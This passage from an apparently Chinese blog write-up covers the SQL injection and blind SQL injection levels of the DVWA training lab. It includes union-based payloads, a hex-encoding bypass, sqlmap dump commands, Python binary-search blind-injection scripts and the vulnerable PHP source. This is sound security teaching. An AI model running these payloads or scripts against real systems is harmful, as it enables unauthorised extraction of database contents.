python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-attr">--batch</span> -D dvwa -T flag <span class="hljs-attr">--columns</span>

python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-attr">--batch</span> -D dvwa -T flag -C fl4g <span class="hljs-attr">--dump</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/f87DeH6rKI2JhzY.png" alt="sqll-5.png"></p>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>与low级别相比较，这里的id值不需要用户输入，只需要选择，但是可以抓包修改id的内容</p>
<p><img src="https://i.loli.net/2020/11/05/VTtp9QbyDe1Gsg8.png" alt="sqlm-1.png"></p>
<h4 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h4><p>经过测试是数字型注入，很简单的判断就不截图了</p>
<h5 id="1-判断列数"><a href="#1-判断列数" class="headerlink" title="1.判断列数"></a>1.判断列数</h5><pre><code class="hljs crmsh"><span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-comment">#&amp;Submit=Submit</span></code></pre>

<p><img src="https://i.loli.net/2020/11/05/GuUbcedZETzJ7qw.png" alt="sqlm-2.png"></p>
<p>此时页面正常</p>
<pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#&amp;Submit=Submit</code></pre>

<p>此时页面报错</p>
<p><code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code></p>
<p>所以可知为两列，之后的操作与low级别的一样</p>
<h5 id="2-union查询"><a href="#2-union查询" class="headerlink" title="2.union查询"></a>2.union查询</h5><pre><code class="hljs pgsql">爆数据库名
id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()#&amp;Submit=Submit
爆列名
id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x666c6167</span> #&amp;Submit=Submit

读取flag
id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(fl4g) <span class="hljs-keyword">from</span> flag #&amp;Submit=Submit
</code></pre>

<p>这里读取列名的时候需要注意使用列名的十六进制，不然就会报错，应该是 <code>&#39;</code>被 <code>\</code>转义了，可以使用十六进制绕过</p>
<p><img src="https://i.loli.net/2020/11/05/OlNHhc4Zy9KnsYS.png" alt="sqlm-3.png"></p>
<p><img src="https://i.loli.net/2020/11/05/zM1eE3plignbySf.png" alt="sqlm-4.png"></p>
<p><strong>分析源码</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];

    <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$id</span>);

    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">// Get results</span>
    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;
        <span class="hljs-comment">// Display values</span>
        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];
        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];

        <span class="hljs-comment">// Feedback for end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;
    &#125;

&#125;

<span class="hljs-comment">// This is used later on in the index.php page</span>
<span class="hljs-comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span>
<span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;
<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
<span class="hljs-variable">$number_of_rows</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>( <span class="hljs-variable">$result</span> )[<span class="hljs-number">0</span>];

<span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);
<span class="hljs-meta">?&gt;</span></code></pre>

<p><code>mysqli_real_escape_string()</code> 函数转义在 SQL 语句中使用的字符串中的特殊字符。</p>
<p>所以导致了单引号被转义的结果</p>
<h4 id="sqlmap注入-1"><a href="#sqlmap注入-1" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><p>因为是post注入，所以需要抓取数据包保存下来。</p>
<p>如图，可以将其保存在sqlmap.py的路径下</p>
<p><img src="https://i.loli.net/2020/11/06/hySBmFe4zoTgvNq.png" alt="sqlm-5.png"></p>
<h5 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h5><pre><code class="hljs stylus">python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--batch</span> <span class="hljs-attr">--dbs</span>
python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--batch</span> -D dvwa <span class="hljs-attr">--tables</span>
python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--batch</span> -D dvwa -T flag <span class="hljs-attr">--columns</span>
python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--batch</span> -D dvwa -T flag -C fl4g <span class="hljs-attr">--dump</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/zaHYUItEZlPFh4e.png" alt="sqlm-6.png"></p>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>这次用户输入与回显不在同一个页面，这只要是为了防止sqlmap这种自动化注入工具的攻击</p>
<p><img src="https://i.loli.net/2020/11/06/kAdfp8SFCroTlID.png" alt="sqlh-1.png"></p>
<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><p>直接使用low级别的payload：</p>
<pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=database()<span class="hljs-meta">#</span>
<span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-meta">#</span>
<span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-meta">#</span></code></pre>



<p><img src="https://i.loli.net/2020/11/06/4sjoOwYKa3lW6S1.png" alt="sqlh-2.png"></p>
<p><img src="https://i.loli.net/2020/11/06/vXlbSQk1cn2JTAB.png" alt="sqlh-3.png"></p>
<p><img src="https://i.loli.net/2020/11/06/IohbvktCq2NpyDa.png" alt="sqlh-4.png"></p>
<p>源码分析</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span> [ <span class="hljs-string">&#x27;id&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];

    <span class="hljs-comment">// Check database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">// Get results</span>
    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;
        <span class="hljs-comment">// Get values</span>
        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];
        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];

        <span class="hljs-comment">// Feedback for end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;
    &#125;

    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<pre><code class="hljs n1ql">$query  = &quot;<span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>;&quot;;</code></pre>

<p>存在注入的语句只是在low级别的基础上加上了<code>Limit</code>限制了回显的行数，但是使用low级别的注入语句时会直接把<code>Limit 1</code>注释掉，所以完全与low级别一样。</p>
<h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
<h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><h4 id="手工加脚本"><a href="#手工加脚本" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>查询成功返回的语句：User ID exists in the database.</p>
<p>查询失败返回的语句：User ID is MISSING from the database.</p>
<p>这样就可以利用提示信息确定，我们所查询的语句是否正确</p>
<p>首先确定盲注的语句</p>
<p>通过下面的测试，说明ascii函数是可以使用的，写注入的脚本，二分法更快点。</p>
<pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substring(database(),1,1))&gt;50 #</span>
<span class="hljs-string">提示 ：User ID exists in the database.</span>
<span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substring(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">50</span> #
提示： <span class="hljs-keyword">User</span> ID <span class="hljs-keyword">is</span> MISSING <span class="hljs-keyword">from</span> the <span class="hljs-keyword">database</span>.</code></pre>





<p><img src="https://i.loli.net/2020/12/08/nyQJR3ZHDYW87wt.png" alt="image-20201026201632666"></p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/10/26 17:29</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : dvwa.py</span>
<span class="hljs-comment"># 二分法盲注</span>
<span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=&quot;</span>

header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span>&#125;
flag = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment">#获取数据库名</span>
        <span class="hljs-comment">#payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#获取表名</span>
        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#获取列名</span>
        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#获取flag</span>
        payload = <span class="hljs-string">&quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        url1 =url+payload+<span class="hljs-string">&quot;&amp;Submit=Submit#&quot;</span>
        response = requests.post(url1,headers= header)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exists&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
<span class="hljs-built_in">print</span>(flag)</code></pre>

<p>1.首先获取表名</p>
<p>使用payload:</p>
<pre><code class="hljs n1ql">payload = &quot;1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/YfAIjUFeiEodHML.png" alt="bsqll-1.png"></p>
<p>2.获取列名</p>
<p>使用payload</p>
<pre><code class="hljs n1ql">payload = &quot;1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/AoaD41sLJ5wmbeG.png" alt="bsqll-2.png"></p>
<p>3.获取flag</p>
<p>使用payload</p>
<pre><code class="hljs n1ql">payload = &quot;1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(fl4g),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span></code></pre>

<p><img src="https://i.loli.net/2020/11/06/9taguv2jR6cU5VD.png" alt="bsqll-3.png"></p>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span>

python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span>

python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa -T flag <span class="hljs-attr">--columns</span> <span class="hljs-attr">--batch</span>

python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>  -D dvwa -T flag -C fl4g <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span></code></pre>



<h3 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h3><h4 id="手工加脚本-1"><a href="#手工加脚本-1" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>与low级别不同，中级别提交数据是post类型，所以需要抓包后再提交。</p>
<pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">4</span> #&amp;Submit=Submit
提示<span class="hljs-keyword">User</span> ID <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> the <span class="hljs-keyword">database</span>.
id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> #&amp;Submit=Submit
<span class="hljs-keyword">User</span> ID <span class="hljs-keyword">is</span> MISSING <span class="hljs-keyword">from</span> the <span class="hljs-keyword">database</span></code></pre>

<p>所以思路还是与low级别一样，只不过脚本中提交数据的方式改为POST类型</p>
<p>直接上脚本</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span>

header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>&#125;
flag = <span class="hljs-string">&quot;&quot;</span>
t = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment">#payload = &quot;1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#payload = &quot;1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#payload = &quot;1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload, <span class="hljs-string">&#x27;Submit&#x27;</span>: <span class="hljs-string">&#x27;Submit&#x27;</span>&#125;

        response = requests.post(url,headers = header,data=data)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exists&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-built_in">print</span>(mid)
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
<span class="hljs-built_in">print</span>(flag)
</code></pre>

<h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-attr">--dbs</span>


python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -D dvwa <span class="hljs-attr">--tables</span>

python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -D dvwa -T flag <span class="hljs-attr">--columns</span>

python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;id=1&amp;Submit=Submit&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> -D dvwa -T flag -C fl4g <span class="hljs-attr">--dump</span>
</code></pre>



<p><img src="https://i.loli.net/2020/11/12/uI6w2bnCjsJfQHG.png" alt="bsqlh-1.png"></p>
<p>sqlmap中给了三种注入方式，并且给出了payload，可以基于给出的提示继续做下去</p>
<p>下面是sqlmap爆出的flag。</p>
<p><img src="https://i.loli.net/2020/11/12/ZdwnMI6vhbRCikc.png" alt="bsqlh-2.png"></p>
<p>源码分析</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123; 
    <span class="hljs-comment">// Get input </span>
    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ]; 
    <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$id</span> ); 

    <span class="hljs-comment">// Check database </span>
    <span class="hljs-variable">$getid</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>; 
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>( <span class="hljs-variable">$getid</span> ); <span class="hljs-comment">// Removed &#x27;or die&#x27; to suppress mysql errors </span>

    <span class="hljs-comment">// Get results </span>
    <span class="hljs-variable">$num</span> = @<span class="hljs-title function_ invoke__">mysql_numrows</span>( <span class="hljs-variable">$result</span> ); <span class="hljs-comment">// The &#x27;@&#x27; character suppresses errors </span>
    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span> ) &#123; 
        <span class="hljs-comment">// Feedback for end user </span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>; 
    &#125; 
    <span class="hljs-keyword">else</span> &#123; 
        <span class="hljs-comment">// Feedback for end user </span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>; 
    &#125; 

